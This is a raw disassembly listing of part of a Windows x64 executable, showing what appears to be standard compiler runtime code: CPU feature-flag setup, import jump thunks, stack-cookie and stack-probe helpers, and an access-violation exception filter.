   140002515:	89 1d 3d 2b 00 00    	mov    %ebx,0x2b3d(%rip)        # 0x140005058
   14000251b:	48 89 05 2e 2b 00 00 	mov    %rax,0x2b2e(%rip)        # 0x140005050
   140002522:	eb 07                	jmp    0x14000252b
   140002524:	48 8b 05 25 2b 00 00 	mov    0x2b25(%rip),%rax        # 0x140005050
   14000252b:	0f ba e6 17          	bt     $0x17,%esi
   14000252f:	73 0c                	jae    0x14000253d
   140002531:	48 0f ba f0 18       	btr    $0x18,%rax
   140002536:	48 89 05 13 2b 00 00 	mov    %rax,0x2b13(%rip)        # 0x140005050
   14000253d:	41 0f ba e2 13       	bt     $0x13,%r10d
   140002542:	73 4a                	jae    0x14000258e
   140002544:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140002548:	22 c2                	and    %dl,%al
   14000254a:	3a c2                	cmp    %dl,%al
   14000254c:	75 40                	jne    0x14000258e
   14000254e:	41 8b cb             	mov    %r11d,%ecx
   140002551:	41 8b c3             	mov    %r11d,%eax
   140002554:	48 c1 e9 10          	shr    $0x10,%rcx
   140002558:	25 ff 00 04 00       	and    $0x400ff,%eax
   14000255d:	83 e1 07             	and    $0x7,%ecx
   140002560:	89 05 96 31 00 00    	mov    %eax,0x3196(%rip)        # 0x1400056fc
   140002566:	48 81 c9 28 00 00 01 	or     $0x1000028,%rcx
   14000256d:	48 f7 d1             	not    %rcx
   140002570:	48 23 0d d9 2a 00 00 	and    0x2ad9(%rip),%rcx        # 0x140005050
   140002577:	48 89 0d d2 2a 00 00 	mov    %rcx,0x2ad2(%rip)        # 0x140005050
   14000257e:	83 f8 01             	cmp    $0x1,%eax
   140002581:	76 0b                	jbe    0x14000258e
   140002583:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140002587:	48 89 0d c2 2a 00 00 	mov    %rcx,0x2ac2(%rip)        # 0x140005050
   14000258e:	41 0f ba e2 15       	bt     $0x15,%r10d
   140002593:	73 14                	jae    0x1400025a9
   140002595:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140002599:	48 0f ba e0 13       	bt     $0x13,%rax
   14000259e:	73 09                	jae    0x1400025a9
   1400025a0:	48 0f ba 35 a7 2a 00 	btrq   $0x7,0x2aa7(%rip)        # 0x140005050
   1400025a7:	00 07 
   1400025a9:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400025ae:	33 c0                	xor    %eax,%eax
   1400025b0:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025b5:	48 83 c4 10          	add    $0x10,%rsp
   1400025b9:	41 5e                	pop    %r14
   1400025bb:	5f                   	pop    %rdi
   1400025bc:	5d                   	pop    %rbp
   1400025bd:	c3                   	ret
   1400025be:	cc                   	int3
   1400025bf:	cc                   	int3
   1400025c0:	33 c0                	xor    %eax,%eax
   1400025c2:	39 05 a8 2a 00 00    	cmp    %eax,0x2aa8(%rip)        # 0x140005070
   1400025c8:	0f 95 c0             	setne  %al
   1400025cb:	c3                   	ret
   1400025cc:	cc                   	int3
   1400025cd:	cc                   	int3
   1400025ce:	cc                   	int3
   1400025cf:	cc                   	int3
   1400025d0:	ff 25 32 0b 00 00    	jmp    *0xb32(%rip)        # 0x140003108
   1400025d6:	ff 25 1c 0b 00 00    	jmp    *0xb1c(%rip)        # 0x1400030f8
   1400025dc:	ff 25 1e 0b 00 00    	jmp    *0xb1e(%rip)        # 0x140003100
   1400025e2:	ff 25 08 0b 00 00    	jmp    *0xb08(%rip)        # 0x1400030f0
   1400025e8:	ff 25 22 0b 00 00    	jmp    *0xb22(%rip)        # 0x140003110
   1400025ee:	ff 25 3c 0c 00 00    	jmp    *0xc3c(%rip)        # 0x140003230
   1400025f4:	ff 25 9e 0b 00 00    	jmp    *0xb9e(%rip)        # 0x140003198
   1400025fa:	ff 25 90 0b 00 00    	jmp    *0xb90(%rip)        # 0x140003190
   140002600:	ff 25 42 0c 00 00    	jmp    *0xc42(%rip)        # 0x140003248
   140002606:	ff 25 34 0c 00 00    	jmp    *0xc34(%rip)        # 0x140003240
   14000260c:	ff 25 a6 0b 00 00    	jmp    *0xba6(%rip)        # 0x1400031b8
   140002612:	ff 25 38 0c 00 00    	jmp    *0xc38(%rip)        # 0x140003250
   140002618:	ff 25 1a 0c 00 00    	jmp    *0xc1a(%rip)        # 0x140003238
   14000261e:	ff 25 04 0c 00 00    	jmp    *0xc04(%rip)        # 0x140003228
   140002624:	ff 25 f6 0b 00 00    	jmp    *0xbf6(%rip)        # 0x140003220
   14000262a:	ff 25 e0 0b 00 00    	jmp    *0xbe0(%rip)        # 0x140003210
   140002630:	ff 25 b2 0b 00 00    	jmp    *0xbb2(%rip)        # 0x1400031e8
   140002636:	ff 25 34 0c 00 00    	jmp    *0xc34(%rip)        # 0x140003270
   14000263c:	ff 25 9e 0b 00 00    	jmp    *0xb9e(%rip)        # 0x1400031e0
   140002642:	ff 25 90 0b 00 00    	jmp    *0xb90(%rip)        # 0x1400031d8
   140002648:	ff 25 a2 0b 00 00    	jmp    *0xba2(%rip)        # 0x1400031f0
   14000264e:	ff 25 54 0b 00 00    	jmp    *0xb54(%rip)        # 0x1400031a8
   140002654:	ff 25 2e 0b 00 00    	jmp    *0xb2e(%rip)        # 0x140003188
   14000265a:	ff 25 08 0c 00 00    	jmp    *0xc08(%rip)        # 0x140003268
   140002660:	ff 25 1a 0b 00 00    	jmp    *0xb1a(%rip)        # 0x140003180
   140002666:	ff 25 94 0b 00 00    	jmp    *0xb94(%rip)        # 0x140003200
   14000266c:	ff 25 86 0b 00 00    	jmp    *0xb86(%rip)        # 0x1400031f8
   140002672:	ff 25 50 0b 00 00    	jmp    *0xb50(%rip)        # 0x1400031c8
   140002678:	ff 25 52 0b 00 00    	jmp    *0xb52(%rip)        # 0x1400031d0
   14000267e:	cc                   	int3
   14000267f:	cc                   	int3
   140002680:	48 83 ec 28          	sub    $0x28,%rsp
   140002684:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140002688:	48 8b ca             	mov    %rdx,%rcx
   14000268b:	49 8b d1             	mov    %r9,%rdx
   14000268e:	e8 0d 00 00 00       	call   0x1400026a0
   140002693:	b8 01 00 00 00       	mov    $0x1,%eax
   140002698:	48 83 c4 28          	add    $0x28,%rsp
   14000269c:	c3                   	ret
   14000269d:	cc                   	int3
   14000269e:	cc                   	int3
   14000269f:	cc                   	int3
   1400026a0:	40 53                	rex push %rbx
   1400026a2:	45 8b 18             	mov    (%r8),%r11d
   1400026a5:	48 8b da             	mov    %rdx,%rbx
   1400026a8:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1400026ac:	4c 8b c9             	mov    %rcx,%r9
   1400026af:	41 f6 00 04          	testb  $0x4,(%r8)
   1400026b3:	4c 8b d1             	mov    %rcx,%r10
   1400026b6:	74 13                	je     0x1400026cb
   1400026b8:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400026bc:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1400026c0:	f7 d8                	neg    %eax
   1400026c2:	4c 03 d1             	add    %rcx,%r10
   1400026c5:	48 63 c8             	movslq %eax,%rcx
   1400026c8:	4c 23 d1             	and    %rcx,%r10
   1400026cb:	49 63 c3             	movslq %r11d,%rax
   1400026ce:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1400026d2:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400026d6:	8b 48 08             	mov    0x8(%rax),%ecx
   1400026d9:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400026dd:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   1400026e2:	74 0b                	je     0x1400026ef
   1400026e4:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   1400026e9:	83 e0 f0             	and    $0xfffffff0,%eax
   1400026ec:	4c 03 c8             	add    %rax,%r9
   1400026ef:	4c 33 ca             	xor    %rdx,%r9
   1400026f2:	49 8b c9             	mov    %r9,%rcx
   1400026f5:	5b                   	pop    %rbx
   1400026f6:	e9 15 f1 ff ff       	jmp    0x140001810
   1400026fb:	cc                   	int3
   1400026fc:	cc                   	int3
   1400026fd:	cc                   	int3
   1400026fe:	cc                   	int3
   1400026ff:	cc                   	int3
   140002700:	cc                   	int3
   140002701:	cc                   	int3
   140002702:	cc                   	int3
   140002703:	cc                   	int3
   140002704:	cc                   	int3
   140002705:	cc                   	int3
   140002706:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000270d:	00 00 00 
   140002710:	48 83 ec 10          	sub    $0x10,%rsp
   140002714:	4c 89 14 24          	mov    %r10,(%rsp)
   140002718:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000271d:	4d 33 db             	xor    %r11,%r11
   140002720:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   140002725:	4c 2b d0             	sub    %rax,%r10
   140002728:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000272c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   140002733:	00 00 
   140002735:	4d 3b d3             	cmp    %r11,%r10
   140002738:	73 16                	jae    0x140002750
   14000273a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   140002740:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   140002747:	41 c6 03 00          	movb   $0x0,(%r11)
   14000274b:	4d 3b d3             	cmp    %r11,%r10
   14000274e:	75 f0                	jne    0x140002740
   140002750:	4c 8b 14 24          	mov    (%rsp),%r10
   140002754:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140002759:	48 83 c4 10          	add    $0x10,%rsp
   14000275d:	c3                   	ret
   14000275e:	ff 25 84 09 00 00    	jmp    *0x984(%rip)        # 0x1400030e8
   140002764:	ff 25 b6 09 00 00    	jmp    *0x9b6(%rip)        # 0x140003120
   14000276a:	cc                   	int3
   14000276b:	cc                   	int3
   14000276c:	cc                   	int3
   14000276d:	cc                   	int3
   14000276e:	cc                   	int3
   14000276f:	cc                   	int3
   140002770:	cc                   	int3
   140002771:	cc                   	int3
   140002772:	cc                   	int3
   140002773:	cc                   	int3
   140002774:	cc                   	int3
   140002775:	cc                   	int3
   140002776:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000277d:	00 00 00 
   140002780:	ff e0                	jmp    *%rax
   140002782:	cc                   	int3
   140002783:	cc                   	int3
   140002784:	cc                   	int3
   140002785:	cc                   	int3
   140002786:	cc                   	int3
   140002787:	cc                   	int3
   140002788:	cc                   	int3
   140002789:	cc                   	int3
   14000278a:	cc                   	int3
   14000278b:	cc                   	int3
   14000278c:	cc                   	int3
   14000278d:	cc                   	int3
   14000278e:	cc                   	int3
   14000278f:	cc                   	int3
   140002790:	cc                   	int3
   140002791:	cc                   	int3
   140002792:	cc                   	int3
   140002793:	cc                   	int3
   140002794:	cc                   	int3
   140002795:	cc                   	int3
   140002796:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000279d:	00 00 00 
   1400027a0:	ff 25 f2 0a 00 00    	jmp    *0xaf2(%rip)        # 0x140003298
   1400027a6:	cc                   	int3
   1400027a7:	cc                   	int3
   1400027a8:	cc                   	int3
   1400027a9:	cc                   	int3
   1400027aa:	cc                   	int3
   1400027ab:	cc                   	int3
   1400027ac:	cc                   	int3
   1400027ad:	cc                   	int3
   1400027ae:	cc                   	int3
   1400027af:	cc                   	int3
   1400027b0:	40 55                	rex push %rbp
   1400027b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400027b6:	48 8b ea             	mov    %rdx,%rbp
   1400027b9:	48 8b 01             	mov    (%rcx),%rax
   1400027bc:	48 8b d1             	mov    %rcx,%rdx
   1400027bf:	8b 08                	mov    (%rax),%ecx
   1400027c1:	e8 3a fe ff ff       	call   0x140002600
   1400027c6:	90                   	nop
   1400027c7:	48 83 c4 20          	add    $0x20,%rsp
   1400027cb:	5d                   	pop    %rbp
   1400027cc:	c3                   	ret
   1400027cd:	cc                   	int3
   1400027ce:	40 55                	rex push %rbp
   1400027d0:	48 8b ea             	mov    %rdx,%rbp
   1400027d3:	48 8b 01             	mov    (%rcx),%rax
   1400027d6:	33 c9                	xor    %ecx,%ecx
   1400027d8:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   1400027de:	0f 94 c1             	sete   %cl
   1400027e1:	8b c1                	mov    %ecx,%eax
   1400027e3:	5d                   	pop    %rbp
   1400027e4:	c3                   	ret
   1400027e5:	cc                   	int3
